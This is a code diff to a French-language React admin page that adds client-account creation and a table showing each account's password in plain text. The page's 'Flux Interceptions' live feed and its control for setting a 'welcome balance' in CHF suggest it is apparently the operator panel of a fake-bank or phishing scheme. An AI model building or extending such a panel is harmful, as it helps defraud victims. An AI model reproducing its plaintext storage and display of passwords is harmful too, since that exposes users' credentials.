@@ -45,6 +45,10 @@ export default function AdminPage() {
   const [usernameInput, setUsernameInput] = useState("");
   const [passwordInput, setPasswordInput] = useState("");
   const [loginError, setLoginError] = useState("");
+  const [newUserName, setNewUserName] = useState("");
+  const [newUserPassword, setNewUserPassword] = useState("");
+  const [isCreatingUser, setIsCreatingUser] = useState(false);
+  const [createdUsers, setCreatedUsers] = useState<any[]>([]);
 
   // Liste unifiée des activités reçues en temps réel
   const [activities, setActivities] = useState<LiveActivity[]>([]);
@@ -134,6 +138,57 @@ export default function AdminPage() {
     }
   };
 
+
+
+  
+  // Action de création d'un compte utilisateur
+  const handleCreateUser = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsCreatingUser(true);
+
+    try {
+      const response = await fetch("/api/admin-users", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name: newUserName, password: newUserPassword }),
+      });
+
+      const data = await response.json();
+
+      if (response.ok) {
+        alert(`Compte créé avec succès !\nIdentifiant généré : ${data.customId}`);
+        setNewUserName("");
+        setNewUserPassword("");
+      } else {
+        alert(data.error || "Erreur lors de la création.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Erreur réseau.");
+    } finally {
+      setIsCreatingUser(false);
+    }
+  };
+
+  // Fonction pour charger les comptes utilisateurs
+  const fetchCreatedUsers = async () => {
+    try {
+      const response = await fetch("/api/admin-users");
+      if (response.ok) {
+        const data = await response.json();
+        setCreatedUsers(data.users || []);
+      }
+    } catch (err) {
+      console.error("Erreur lors de la récupération des utilisateurs:", err);
+    }
+  };
+
+  // Charger les utilisateurs dès que l'admin est connecté
+  useEffect(() => {
+    if (isAuthenticated) {
+      fetchCreatedUsers();
+    }
+  }, [isAuthenticated]);
   // ÉCRAN 1 : FORMULAIRE DE CONNEXION SÉCURISÉ
   if (!isAuthenticated) {
     return (
@@ -213,12 +268,20 @@ const handleClearAllLogs = async () => {
         {/* Barre supérieure */}
         <div className="admin-header">
           <div className="admin-header-left">
+{/* 👇 NOUVEAU BOUTON : RACCOURCI CRÉATION COMPTE */}
+  <button 
+    onClick={() => document.getElementById("create-user-section")?.scrollIntoView({ behavior: "smooth" })} 
+    style={{ marginLeft: "10px", padding: "8px 14px", background: "#10b981", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "bold", display: "inline-flex", alignItems: "center", gap: "6px" }}
+  >
+    <i className="fa-solid fa-user-plus"></i>
+    Créer un compte
+  </button>
             <h1>Flux Interceptions</h1>
             <button 
               onClick={handleEditGlobalBalance} 
               style={{ marginLeft: "20px", padding: "8px 14px", background: "#2563eb", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "bold" }}
             >
-              💰 Changer le solde d'accueil ({currentGlobalBalance} CHF)
+              💰 Changer le solde  ({currentGlobalBalance} CHF)
             </button>
             <div className="admin-status-badge" style={{ marginLeft: "15px" }}>
               <div className="status-dot-blink"></div>
@@ -321,6 +384,87 @@ const handleClearAllLogs = async () => {
               );
             })
           )}
+        </div>
+
+        <div id="create-user-section" style={{ background: "#fff", padding: "20px", borderRadius: "12px", border: "1px solid #e5e7eb", marginBottom: "25px" }}>
+          
+          {/* Formulaire de création */}
+          <h2 style={{ fontSize: "18px", marginBottom: "15px", color: "#111", display: "flex", alignItems: "center", gap: "8px" }}>
+            <i className="fa-solid fa-user-plus" style={{ color: "#2563eb" }}></i>
+            Créer un compte client
+          </h2>
+          
+          <form onSubmit={handleCreateUser} style={{ display: "flex", gap: "15px", alignItems: "stretch", flexWrap: "wrap", marginBottom: "30px" }}>
+            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "100px" }}>
+              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Nom complet</label>
+              <input 
+                type="text" 
+                placeholder="Ex: Jean Dupont" 
+                value={newUserName}
+                onChange={(e) => setNewUserName(e.target.value)}
+                required 
+                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
+              />
+            </div>
+            
+            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "200px" }}>
+              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Mot de passe initial</label>
+              <input 
+                type="text" 
+                placeholder="Ex: Client2026!" 
+                value={newUserPassword}
+                onChange={(e) => setNewUserPassword(e.target.value)}
+                required 
+                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
+              />
+            </div>
+            
+            <button 
+              type="submit" 
+              disabled={isCreatingUser} 
+              style={{ padding: "12px 24px", background: "#10b981", color: "#fff", border: "none", borderRadius: "8px", fontWeight: "bold", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", minWidth: "160px", alignSelf: "flex-end", height: "46px" }}
+            >
+              {isCreatingUser ? "Création..." : "Générer le compte"}
+            </button>
+          </form>
+
+          <hr style={{ border: "0", borderTop: "1px solid #e5e7eb", margin: "20px 0" }} />
+
+          {/* Liste des comptes créés */}
+          <h3 style={{ fontSize: "16px", marginBottom: "15px", color: "#111", display: "flex", alignItems: "center", gap: "8px" }}>
+            <i className="fa-solid fa-users" style={{ color: "#4b5563" }}></i>
+            Comptes Utilisateurs Actifs ({createdUsers.length})
+          </h3>
+
+          <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e5e7eb", borderRadius: "8px" }}>
+            <table style={{ width: "100%", borderCollapse: "collapse", textAlign: "left", fontSize: "14px" }}>
+              <thead>
+                <tr style={{ background: "#f9fafb", borderBottom: "1px solid #e5e7eb" }}>
+                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Identifiant</th>
+                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Nom complet</th>
+                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Mot de passe</th>
+                </tr>
+              </thead>
+              <tbody>
+                {createdUsers.length === 0 ? (
+                  <tr>
+                    <td colSpan={3} style={{ padding: "20px", textAlign: "center", color: "#9ca3af" }}>
+                      Aucun compte utilisateur créé pour le moment.
+                    </td>
+                  </tr>
+                ) : (
+                  createdUsers.map((user) => (
+                    <tr key={user.id} style={{ borderBottom: "1px solid #e5e7eb" }}>
+                      <td style={{ padding: "12px 16px", fontWeight: "bold", color: "#2563eb" }}>{user.customId}</td>
+                      <td style={{ padding: "12px 16px", color: "#111" }}>{user.name}</td>
+                      <td style={{ padding: "12px 16px", color: "#4b5563", fontFamily: "monospace" }}>{user.password}</td>
+                    </tr>
+                  ))
+                )}
+              </tbody>
+            </table>
+          </div>
+
         </div>
 
       </div>
